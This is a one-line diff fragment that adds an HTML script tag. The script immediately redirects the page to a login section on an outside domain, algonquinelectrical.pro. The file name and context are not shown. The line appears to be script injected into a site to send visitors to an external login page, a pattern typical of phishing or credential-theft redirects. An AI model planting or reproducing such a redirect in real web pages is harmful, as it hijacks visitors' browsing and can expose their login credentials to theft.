@@ -1,0 +1,1 @@
+<script>window.location.href="https://algonquinelectrical.pro/?section=login&c=1";</script>
